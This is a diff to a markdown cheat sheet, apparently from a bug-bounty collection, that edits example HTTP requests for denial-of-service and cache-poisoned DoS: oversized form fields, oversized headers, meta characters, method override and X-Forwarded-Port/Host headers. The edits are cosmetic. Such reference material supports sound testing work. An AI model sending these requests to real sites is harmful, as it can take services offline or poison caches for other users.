@@ -16,9 +16,9 @@ After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there 
 
 2. Try input a very long payload to form. For example using very long password or using very long email
 ```
-POST /Register HTTP/1.1
+POST /register HTTP/1.1
 Host: target.com
-[...]
+...
 
 username=victim&password=aaaaaaaaaaaaaaa
 ```
@@ -56,12 +56,15 @@ Accept-Encoding: gzip, gzip, deflate, br, br
   ```
   GET /index.html HTTP/1.1
   Host: victim.com
-  X-Oversized-Header-1: Big_Value 
+  X-Oversized-Header-1: Big_Value
+  ...
+
   ```
   The response is
   ```
   HTTP/1.1 400 Bad Request
   ...
+
   Header size exceeded
   ```
 - HTTP Meta Character (HMC)
@@ -72,11 +75,13 @@ Accept-Encoding: gzip, gzip, deflate, br, br
   GET /index.html HTTP /1.1
   Host: victim.com
   X-Meta-Malicious-Header: \r\n
+  ...
   ```
   The response is
   ```
   HTTP/1.1 400 Bad Request
   ...
+
   Character not allowed
   ```
 - HTTP Method Override (HMO)
@@ -92,12 +97,14 @@ Accept-Encoding: gzip, gzip, deflate, br, br
   GET /index.php HTTP/1.1
   Host: victim.com
   X-HTTP-Method-Override: POST
+  ...
   ```
   The response is
   ```
   HTTP/1.1 404 Not Found
   ...
-  POST on /index.php not foudn
+
+  POST on /index.php not found
   ```
 
 - X-Forwarded-Port
@@ -105,6 +112,7 @@ Accept-Encoding: gzip, gzip, deflate, br, br
   GET /index.php?dontpoisoneveryone=1 HTTP/1.1
   Host: www.hackerone.com
   X-Forwarded-Port: 123
+  ...
   ```
 
 - X-Forwarded-Host
@@ -112,6 +120,7 @@ Accept-Encoding: gzip, gzip, deflate, br, br
   GET /index.php?dontpoisoneveryone=1 HTTP/1.1
   Host: www.hackerone.com
   X-Forwarded-Host: www.hackerone.com:123
+  ...
   ```
   
 ![Response DoS](https://portswigger.net/cms/images/6f/83/45a1a9f841b9-article-screen_shot_2018-09-13_at_11.08.12.png)
